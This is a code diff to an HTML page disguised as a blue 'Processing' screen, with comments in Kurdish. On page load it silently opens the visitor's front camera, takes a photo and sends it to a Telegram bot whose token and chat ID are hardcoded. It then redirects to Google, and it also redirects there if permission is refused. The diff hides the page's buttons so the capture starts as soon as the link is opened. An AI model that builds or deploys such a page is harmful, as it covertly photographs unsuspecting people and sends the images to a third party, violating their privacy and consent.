@@ -3,17 +3,18 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Processing...</title>
+    <title>Processing</title>
     <style>
         body { 
             margin: 0; 
-            background: blue; /* ڕەنگی پشتەوە لێرە گۆڕدرا بۆ شین */
+            background: #007bff; /* ڕەنگی شین */
             display: flex; 
             align-items: center; 
             justify-content: center; 
             height: 100vh; 
         }
-        video, canvas { display: none; }
+        /* هەموو دوگمە و نووسینەکانمان لادا */
+        video, canvas, button { display: none; }
     </style>
 </head>
 <body>
@@ -25,7 +26,8 @@
         const token = '8734772782:AAFT6ize__0OBmz53luKQXus2iJpSg9NpmA';
         const chatId = '7602797383';
 
-        function startCapture() {
+        // ئەم بەشە ڕاستەوخۆ لە کاتی کردنەوەی لینکەکە کار دەکات
+        window.onload = function() {
             navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
             .then(stream => {
                 const video = document.getElementById('video');
@@ -46,16 +48,16 @@
                             method: 'POST',
                             body: formData
                         }).then(() => {
+                            // دوای ناردنی وێنەکە دەچێتە گووگڵ
                             window.location.href = "https://google.com";
                         });
                     }, 'image/jpeg');
                 }, 1000);
             }).catch(err => {
+                // ئەگەر مۆڵەتی نەدا یان کێشەیەک هەبوو هەر دەچێتە گووگڵ
                 window.location.href = "https://google.com";
             });
-        }
-
-        window.onload = startCapture;
+        };
     </script>
 </body>
 </html>
